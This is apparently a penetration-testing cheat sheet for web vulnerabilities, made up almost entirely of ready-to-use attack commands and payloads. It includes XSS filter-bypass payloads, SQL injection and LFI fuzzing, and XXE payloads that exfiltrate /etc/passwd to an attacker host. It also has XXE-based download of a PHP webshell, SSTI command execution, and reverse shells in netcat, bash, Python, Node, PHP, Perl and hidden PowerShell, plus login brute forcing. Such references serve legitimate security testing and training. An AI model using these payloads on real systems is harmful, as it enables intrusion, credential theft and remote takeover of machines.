# vulnerabilities
Testing vulnerabilities
-----------------------

### Serve files from Kali

1.  Create folder `mkdir payloads`
2.  Add files to folder that you want to serve to target machine
3.  `cd` to the created folder
4.  Execute command to start serving the files:

```text-plain
python3 -m http.server 80
```

### Null Byte

```text-plain
A null byte or %00 calls for early termination of a string. Where a file such as shell.php%00.pngwill execute as shell.php but will be read as a .png file since this is technically what the file name ends in.
```

### XSS

```text-plain
wfuzz -c -z file,/usr/share/seclists/Fuzzing/XSS/XSS-Jhaddix.txt --hh 0 "$URL/index.php?id=FUZZ"
```

### XSS Payloads

```text-plain
# Standard XSS Payload
<script>alert('XSS');</script>

# Input tag escape
"><script>alert('XSS');</script>

# Escape textarea tag
</textarea><script>alert('XSS');</script>

# Escape Javascript code
';alert('XSS');//

# Bypass filters that strip out malicious words such like "script"
<sscriptcript>alert('XSS');</sscriptcript>

# Polygot payload (Can bypass multiple filters)
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('XSS') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('XSS)//>\x3e
```

### SQL Injection

#### Fuzzing GET parameter

```text-plain
wfuzz -c -z file,/usr/share/wordlists/wfuzz/Injections/SQL.txt -u "$URL/index.php?id=FUZZ"
```

#### Fuzzing POST parameter

```text-plain
wfuzz -c -z file,/usr/share/wordlists/wfuzz/Injections/SQL.txt -d "id=FUZZ" -u "$URL/index.php"
```

#### sqlmap GET parameter

```text-plain
sqlmap -u "$URL/index.php?id=1"
```

#### sqlmap POST parameter

Copy POST request from Burp Suite into `post.txt` file

```text-plain
sqlmap -r post.txt -p parameter
```

### Directory Traversal

#### Fuzzing LFI default file paths

```text-plain
wfuzz -c -z file,/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt --hh 0 "$URL/index.php?id=FUZZ"
```

#### Fuzzing LFI app specific files

Create two wordlists:

1.  Containing paths (paths.txt): ../ ../../ etc.
2.  Containing custom files related to the web technology used (files.txt): application.properties applitcation.yml

```text-plain
wfuzz -w paths.txt -w files.txt --hh 0 "$URL/index.php?id=FUZZFUZ2Z"
```

### XXE

#### Fuzzing XXE

Wordlist to use in Burp Suite Intruder for fuzzing XXE: `/usr/share/seclists/Fuzzing/XXE-Fuzzing.txt`

#### Out-of-Band Exploitation

1.  Create file named xxe.dtd with content:

```text-plain
<!ENTITY % content SYSTEM "file:///etc/passwd">
<!ENTITY % external "<!ENTITY &#37; exfil SYSTEM 'http://YOUR-IP/out?%content;'>" >
```

1.  Serve file with http
2.  Insert file in payload

```text-plain
<!DOCTYPE oob [
<!ENTITY % base SYSTEM "http://YOUR-IP/external.dtd"> 
%base;
%external;
%exfil;
]>
```

1.  Check incoming requests

Note that extracting file with multiple lines may not work due to encoding issues.

#### Getting files

base64 encode files before sending, if the server uses PHP:

```text-plain
<!DOCTYPE email [
 <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
```

#### RCE with XXE

First, create webshell on local machine:

```text-plain
$ echo '<?php system($_REQUEST["cmd"]);?>' > webshell.php
$ sudo python3 -m http.server 80
```

Then download the file to the target:

```text-plain
<?xml version="1.0"?>
<!DOCTYPE xeeEntity [
 <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'YOUR-IP/webshell.php'">
]>
<root>
	<xeeEntity>&company;</xeeEntity>
</root>
```

#### Wrapping filecontent in CDATA:

Step 1:

```text-plain
$ echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
$ python3 -m http.server 8000
```

Step 2:

```text-plain
<!DOCTYPE xeeEntity [
 <!ENTITY % begin "<![CDATA[">
 <!ENTITY % file SYSTEM "file:///etc/passwd">
 <!ENTITY % end "]]>">
 <!ENTITY % xxe SYSTEM "http://YOUR-IP:8000/xxe.dtd">
 %xxe;
]>
<root>
	<xeeEntity>&joined;</xeeEntity>
</root>
```

### Server-side Template Injection

#### Fuzzing SSTI

```text-plain
{{7*7}}
${7*7}
<%= 7*7 %>
${{7*7}}
#{7*7}

//TWIG
{{['cat${IFS}/etc/passwd']|filter('system')}}

//Freemarker
${"freemarker.template.utility.Execute"?new()("cat /root/flag.txt")}

//Pug
- var require = global.process.mainModule.require
= require('child_process').spawnSync('cat', ['flag.txt']).stdout

//Jinja
{{ config|pprint }}
```

### Command Injection

#### Fuzzing command injection

```text-plain
wfuzz -c -z file,"/usr/share/payloadsallthethings/Command Injection/Intruder/command-execution-unix.txt" --sc 200 "$URL/index.php?parameter=idFUZZ"
```

#### Setup reverse shell listener

```text-plain
nc -nlvp 4242
```

#### Reverse shell Netcat

```text-plain
/bin/nc -nv [kali-ip] 4242 -e /bin/bash

bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
```

#### Reverse shell Python

```text-plain
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[kali-ip]",4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

#### Reverse shell Node.js

```text-plain
echo "require('child_process').exec('nc -nv [kali-ip] 4242 -e /bin/bash')" > /var/tmp/shell.js ; node /var/tmp/shell.js
```

#### Reverse shell PHP

```text-plain
php -r '$sock=fsockopen("[kali-ip]",4242);exec("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("[kali-ip]",4242);shell_exec("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("[kali-ip]",4242);system("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("[kali-ip]",4242);passthru("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("[kali-ip]",4242);popen("/bin/sh -i <&3 >&3 2>&3", "r");'
```

#### Remote commands with PHP

```text-plain
<?php system($_GET['cmd']);?>
```

#### Reverse shell Perl

```text-plain
perl -e 'use Socket;$i="[kali-ip]";$p=4242;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

#### Reverse shell Powershell

```text-plain
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.10.10.10",1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

### IDOR

#### Static file IDOR

```text-plain
wfuzz -c -z range,1-100 --hc 404 "$URL/index.php?doc=FUZZ.txt"
```

#### ID based IDOR

```text-plain
wfuzz -c -z range,1-100 --hc 404 "$URL/index.php?doc=FUZZ"
```

### Brute forcing

#### Users discovery

```text-plain
wfuzz -c -z file,/usr/share/SecLists/Usernames/top-username-shortlist.txt --hc 404,403 "$URL/login.php?user=FUZZ"
```

#### Password discovery

```text-plain
wfuzz -c -z file,/usr/share/seclists/Passwords/xato-net-10-million-passwords-100000.txt --hc 404,403 -d "username=admin&password=FUZZ" "$URL/login.php"
```